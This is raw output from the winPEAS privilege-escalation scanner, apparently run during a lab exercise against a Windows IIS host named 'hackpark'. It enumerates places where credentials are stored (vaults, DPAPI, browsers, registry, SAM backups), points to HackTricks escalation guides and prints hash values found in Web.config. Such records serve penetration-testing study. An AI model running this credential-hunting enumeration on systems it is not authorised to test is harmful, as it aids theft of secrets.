    FirewallEnabled (Public):    True
    DENY rules:
ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
    win8.ipv6.microsoft.com                                                     
    _ldap._tcp.dc._msdcs.hackpark                                               
    wpad                                                                        
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        WarnOnIntranet                            1
  HKLM        MinorVersion                              0
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files

  Zone Maps                                                                                                                   
  No URLs configured

  Zone Auth Settings                                                                                                          
  No Zone Auth Settings
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): Element not found'
Please run: 
cmdkey /list
ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings                                                                                                         
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False
ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager                                                                                
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
È  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
  [X] Exception: Object reference not set to an instance of an object.
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)                                                                                                                            
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd.exe
    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe
      You must be an administrator to run this check
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
  [X] Exception: Couldn´t parse nt_resp. Len: 0 Message bytes: 4e544c4d5353500003000000010001006800000000000000690000000000000058000000000000005800000010001000580000000000000069000000058a80a2060380250000000fb78c582e67abf60363022ba16f68a5ab4800410043004b005000410052004b0000                                                                                                         
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.
ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.
ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))                    
   --- End of inner exception stack trace ---                                                                                 
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                                                            
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                                                
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()                                                     
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    Not Found
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry                                                                     
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.
                                                                                                                              
    SID: S-1-5-19
   =================================================================================================
    SID: S-1-5-20
   =================================================================================================
    SID: S-1-5-21-141259258-288879770-3894983326-500
   =================================================================================================
    SID: S-1-5-18
   =================================================================================================
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files
                                                                                                                              
ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
  note: check manually if something is found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)
È  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files
                                                                                                                              
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files
                                                                                                                              
ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50
                                                                                                                              
  Last Access Date           User                                           Application           Document
ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found
ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)
                                                                                                                              
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Default
ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)
                                                                                                                              
     Checking folder: c:\users\administrator
                                                                                                                              
   =================================================================================================
     Checking folder: c:\users\jeff
                                                                                                                              
   =================================================================================================
ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ File Analysis ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found MySQL Files
Folder: C:\inetpub\wwwroot\setup\MySQL
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found SSH AGENTS Files
File: C:\windows\temp\Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
                   
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Misc-Emails Regexes
C:\inetpub\wwwroot\Scripts\jQuery\02-jquery.cookie.js: klaus.hartl@stilbuero.de
C:\inetpub\wwwroot\Scripts\jQuery\02-jquery.cookie.js: klaus.hartl@stilbuero.de
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Misc-IPs Regexes
C:\inetpub\wwwroot\Scripts\mediaelement\mediaelement.js: 3.0.0.0
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Misc-Code asigning passwords Regexes
C:\inetpub\wwwroot\Scripts\jQuery\03-jquery.validate.min.js: password, :file, select, textarea","focusin focusout keyup",delegate).validateDelegate(":radio, :checkbox, select, option","click",delegate);if(this.settings.invalidHandler)                  
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Misc-Simple Passwords Regexes
C:\inetpub\wwwroot\Scripts\jQuery\03-jquery.validate.min.js: password, :file, select, textarea","focusin focusout keyup",delegate).validateDelegate(":radio, :checkbox, select, option","click",delegate);if(this.settings.invalidHandler)                  
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Misc-Usernames Regexes
C:\inetpub\wwwroot\Scripts\angular.js: username='A user'">
C:\inetpub\wwwroot\Scripts\angular.js: username = "defaced value"; \}\}
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Misc-Generic API Key Regexes
C:\inetpub\wwwroot\Scripts\angular-sanitize.js: key === 'background'
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Misc-Config Secrets Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-Wallpaper.ps1: $env:
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-Wallpaper.ps1: $env:
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-Wallpaper.ps1: $env:
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Base32 Regexes
C:\inetpub\wwwroot\Scripts\i18n\angular-locale_fr-ga.js: DATETIME
C:\inetpub\wwwroot\Scripts\i18n\angular-locale_fr-ga.js: SHORTDAY
C:\inetpub\wwwroot\Scripts\i18n\angular-locale_fr-ga.js: SHORTMON
C:\inetpub\wwwroot\Scripts\i18n\angular-locale_fr-ga.js: CURRENCY
C:\inetpub\wwwroot\Scripts\i18n\angular-locale_fr-ga.js: PATTERNS
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Adafruit API Key Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Bittrex Access Key and Access Key Regexes
C:\inetpub\wwwroot\Scripts\angular.js: 00001111111111000000000002222222
C:\inetpub\wwwroot\Scripts\angular.js: 22200000000000000000000033333333
C:\inetpub\wwwroot\Scripts\angular.js: 33000000000000004444444444444440
C:\inetpub\wwwroot\Scripts\angular.js: 00000000555555555555555000000066
C:\inetpub\wwwroot\Scripts\angular.js: 66666666666660000000000000007777
C:\inetpub\wwwroot\Scripts\angular.js: 77777700000000000000000008888888
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Coinbase Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------------------------                                                                                                                 
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------------------------                                                                                                                 
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Confluent Access Token & Secret Key Regexes
C:\inetpub\wwwroot\Scripts\jQuery\01-jquery-1.9.1.min.js: onreadystatechan
C:\inetpub\wwwroot\Scripts\jQuery\01-jquery-1.9.1.min.js: onreadystatechan
C:\inetpub\wwwroot\Scripts\jQuery\01-jquery-1.9.1.min.js: onreadystatechan
C:\inetpub\wwwroot\Scripts\jQuery\01-jquery-1.9.1.min.js: onreadystatechan
C:\inetpub\wwwroot\Scripts\jQuery\01-jquery-1.9.1.min.js: onreadystatechan
C:\inetpub\wwwroot\Scripts\jQuery\01-jquery-1.9.1.min.js: onreadystatechan
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Droneci Access Token Regexes
C:\inetpub\wwwroot\Scripts\angular.js: 00001111111111000000000002222222
C:\inetpub\wwwroot\Scripts\angular.js: 22200000000000000000000033333333
C:\inetpub\wwwroot\Scripts\angular.js: 33000000000000004444444444444440
C:\inetpub\wwwroot\Scripts\angular.js: 00000000555555555555555000000066
C:\inetpub\wwwroot\Scripts\angular.js: 66666666666660000000000000007777
C:\inetpub\wwwroot\Scripts\angular.js: 77777700000000000000000008888888
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Etsy Access Token Regexes
C:\inetpub\wwwroot\Scripts\syntaxhighlighter\scripts\shBrushPowerShell.js: valuefrompipelinebyprope
C:\inetpub\wwwroot\Scripts\syntaxhighlighter\scripts\shBrushPowerShell.js: valuefromremainingargume
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Flickr Access Token Regexes
C:\inetpub\wwwroot\Scripts\angular.js: 00001111111111000000000002222222
C:\inetpub\wwwroot\Scripts\angular.js: 22200000000000000000000033333333
C:\inetpub\wwwroot\Scripts\angular.js: 33000000000000004444444444444440
C:\inetpub\wwwroot\Scripts\angular.js: 00000000555555555555555000000066
C:\inetpub\wwwroot\Scripts\angular.js: 66666666666660000000000000007777
C:\inetpub\wwwroot\Scripts\angular.js: 77777700000000000000000008888888
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Freshbooks Access Token Regexes
C:\inetpub\wwwroot\Scripts\angular.js: 0000111111111100000000000222222222200000000000000000000033333333
C:\inetpub\wwwroot\Scripts\angular.js: 3300000000000000444444444444444000000000555555555555555000000066
C:\inetpub\wwwroot\Scripts\angular.js: 6666666666666000000000000000777777777700000000000000000008888888
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Gitter Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Kraken Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------------------------------------------------------                                                                                       
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------------------------------------------------------                                                                                       
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Kucoin Access Token Regexes
C:\inetpub\wwwroot\Scripts\angular.js: 000011111111110000000000
C:\inetpub\wwwroot\Scripts\angular.js: 022222222220000000000000
C:\inetpub\wwwroot\Scripts\angular.js: 000000003333333333000000
C:\inetpub\wwwroot\Scripts\angular.js: 000000004444444444444440
C:\inetpub\wwwroot\Scripts\angular.js: 000000005555555555555550
C:\inetpub\wwwroot\Scripts\angular.js: 000000666666666666666000
C:\inetpub\wwwroot\Scripts\angular.js: 000000000000777777777700
C:\inetpub\wwwroot\Scripts\angular.js: 000000000000000008888888
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Launchdarkly Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Mattermost Access Token Regexes
C:\inetpub\wwwroot\Scripts\syntaxhighlighter\scripts\shBrushPowerShell.js: valuefrompipelinebypropert
C:\inetpub\wwwroot\Scripts\syntaxhighlighter\scripts\shBrushPowerShell.js: valuefromremainingargument
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Netlify Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Nytimes Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Okta Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Plaid Client ID Regexes
C:\inetpub\wwwroot\Scripts\syntaxhighlighter\scripts\shBrushPowerShell.js: valuefrompipelinebyprope
C:\inetpub\wwwroot\Scripts\syntaxhighlighter\scripts\shBrushPowerShell.js: valuefromremainingargume
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Plaid Secret key Regexes
C:\inetpub\wwwroot\Scripts\syntaxhighlighter\scripts\shBrushPowerShell.js: valuefrompipelinebypropertynam
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-RapidAPI Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------------------------
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Sendbird Access Token Regexes
C:\inetpub\wwwroot\Scripts\angular.js: 0000111111111100000000000222222222200000
C:\inetpub\wwwroot\Scripts\angular.js: 0000000000000000333333333300000000000000
C:\inetpub\wwwroot\Scripts\angular.js: 4444444444444440000000005555555555555550
C:\inetpub\wwwroot\Scripts\angular.js: 0000006666666666666660000000000000007777
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Sentry Access Token Regexes
C:\inetpub\wwwroot\Scripts\angular.js: 0000111111111100000000000222222222200000000000000000000033333333
C:\inetpub\wwwroot\Scripts\angular.js: 3300000000000000444444444444444000000000555555555555555000000066
C:\inetpub\wwwroot\Scripts\angular.js: 6666666666666000000000000000777777777700000000000000000008888888
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-SumoLogic Access ID Regexes
C:\inetpub\wwwroot\Scripts\i18n\angular-locale_is-is.js: u00f0vikudagur
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-SumoLogic Access Token Regexes
C:\inetpub\wwwroot\Scripts\angular.js: 0000111111111100000000000222222222200000000000000000000033333333
C:\inetpub\wwwroot\Scripts\angular.js: 3300000000000000444444444444444000000000555555555555555000000066
C:\inetpub\wwwroot\Scripts\angular.js: 6666666666666000000000000000777777777700000000000000000008888888
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Travis CI Access Token Regexes
C:\inetpub\wwwroot\Scripts\mediaelement\mediaelement.js: silverlightmediaelemen
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Zendesk Secret Key Regexes
C:\inetpub\wwwroot\Scripts\angular.js: 0000111111111100000000000222222222200000
C:\inetpub\wwwroot\Scripts\angular.js: 0000000000000000333333333300000000000000
C:\inetpub\wwwroot\Scripts\angular.js: 4444444444444440000000005555555555555550
C:\inetpub\wwwroot\Scripts\angular.js: 0000006666666666666660000000000000007777
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Hubspot API Key Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-HibernateOnSleep.ps1: "96996bc0-ad50-47ec-923b-6f41874dd9eb"
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Kucoin Secret Key Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-MonitorAlwaysOn.ps1: 3c0bc021-c8a8-4e07-a973-6b14cbcb2b7e
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-MojoAuth API Key Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-MonitorAlwaysOn.ps1: 3c0bc021-c8a8-4e07-a973-6b14cbcb2b7e
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-ORB Intelligence Access Key Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-HibernateOnSleep.ps1: "96996bc0-ad50-47ec-923b-6f41874dd9eb"
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Sendbird Access ID Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-MonitorAlwaysOn.ps1: 3c0bc021-c8a8-4e07-a973-6b14cbcb2b7e
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-URLScan API Key Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-HibernateOnSleep.ps1: "96996bc0-ad50-47ec-923b-6f41874dd9eb"
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Vault Token Regexes
C:\inetpub\wwwroot\Scripts\jQuery\01-jquery-1.9.1.min.js: s.isImmediatePropagationSt
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Yandex AWS Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Wait-Sysprep.ps1: YCrEEsWEmALaSKMTs3G1bJlWSHgfCwSjXAOj4rK4
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Base64 Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: aHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEkGCCsGAQUFBzAChj1o                                                                                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: aHR0cDovL2Ny
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: aHR0cDovL29jc3AuZGlnaWNlcnQuY29tME8GCCsG
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Authorization Basic Regexes
C:\inetpub\wwwroot\Scripts\angular.js: basic than
C:\inetpub\wwwroot\Scripts\angular.js: basic examples
C:\inetpub\wwwroot\Scripts\angular.js: basic bindings
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Jenkins Creds Regexes
C:\inetpub\wwwroot\wlwmanifest.xml: <fileUploadNameFormat>{FileName}<
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Artifactory API Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Wait-Sysprep.ps1: AKCBmDAaBgkqhkiG9w0BCQMxDQYLKoZIhvcN
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found APIs-Artifactory Password Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\New-WallpaperSetup.ps1: APFaBhPbrLXkvf9y83BACFfNQ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Raw Hashes-sha1 Regexes
C:\inetpub\wwwroot\Scripts\jquery.form.js: /588306aedba1de01388032d5f42a60159eea9228#
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Raw Hashes-sha256 Regexes
C:\inetpub\wwwroot\Web.config: "BDAAF7E00B69BA47B37EEAC328929A06A6647D4C89FED3A7D5C52B12B23680F4"
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Raw Hashes-sha512 Regexes
C:\inetpub\wwwroot\Web.config: "D9F7287EFDE8DF4CAFF79011D5308643D8F62AE10CDF30DAB640B7399BF6C57B0269D60A23FBCCC736FC2487ED695512BA95044DE4C58DC02C2BA0C4A266454C"                                                                                           
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Raw Hashes-md5 Regexes
